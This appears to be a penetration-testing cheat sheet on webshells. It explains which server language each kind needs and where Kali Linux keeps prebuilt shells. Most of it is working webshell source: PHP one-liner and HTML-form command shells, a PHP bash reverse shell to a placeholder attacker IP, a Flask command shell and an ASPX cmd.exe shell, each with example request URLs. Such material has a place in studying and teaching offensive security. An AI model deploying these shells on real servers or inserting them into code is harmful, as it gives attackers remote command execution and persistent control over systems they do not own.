A **webshell** is a malicious script uploaded to a web server to enable **remote command execution** through a web interface or HTTP requests.  
Webshells are commonly used during post-exploitation to maintain access, execute commands, or pivot deeper into a target environment.

The webshell language must match the server-side technology:

- PHP webshells are used on Linux systems with Apache or Nginx.
- ASP / ASPX webshells are used on Windows servers running IIS.
- JSP webshells are used on Java application servers such as Tomcat.

If the server does not support the language, the webshell will not execute.

---

## Webshells in Kali Linux
In **Kali Linux**, prebuilt webshells can be found in several default locations, mainly within **Metasploit**, **SecLists**, and other offensive security toolsets:

- Metasploit webshells:

```bash
/usr/share/metasploit-framework/data/webshells/
```

- SecLists webshell collections:

```bash
/usr/share/seclists/Web-Shells/
```

 - Laudanum webshell collections:

```bash
/usr/share/wordlists/seclists/Web-Shells/laudanum-1.0 
```

These resources provide ready-to-use webshells for PHP, ASP, ASPX, JSP, and other server-side technologies.

---

## Basic PHP Command Prompt

A minimal PHP script can execute system commands passed via a GET parameter:

```php
<?php system($_GET['cmd']); ?>
```

Example usage:

```
http://example.com/shell.php?cmd=whoami
```

This executes the `whoami` command on the server.

---

## PHP Webshell (HTML Interface)

A more interactive PHP webshell using an HTML form:

```html
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```

This provides a simple web interface to execute commands interactively.

---

## PHP Reverse Shell

Instead of executing single commands, a reverse shell can be established:

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'"); ?>
```

This connects back to the attacker’s listener, providing an interactive shell.

---

## Python Webshell (Flask)

A Python-based webshell using Flask:

```python
import os
from flask import Flask, request

app = Flask(__name__)

@app.route('/')
def shell():
    cmd = request.args.get('cmd')
    if cmd:
        return os.popen(cmd).read()
    return 'Send a command using ?cmd=your_command'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

Commands are executed by sending requests such as:

```
http://target:8080/?cmd=id
```

---

## ASP Webshell (Windows / IIS)

An ASP.NET (C#) webshell for Windows environments:

```asp
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        string cmd = Request["cmd"];
        if (!string.IsNullOrEmpty(cmd))
        {
            Process proc = new Process();
            proc.StartInfo.FileName = "cmd.exe";
            proc.StartInfo.Arguments = "/c " + cmd;
            proc.StartInfo.UseShellExecute = false;
            proc.StartInfo.RedirectStandardOutput = true;
            proc.Start();
            Response.Write("<pre>" + proc.StandardOutput.ReadToEnd() + "</pre>");
        }
    }
</script>
```

Example:

```
http://target/shell.aspx?cmd=whoami
```
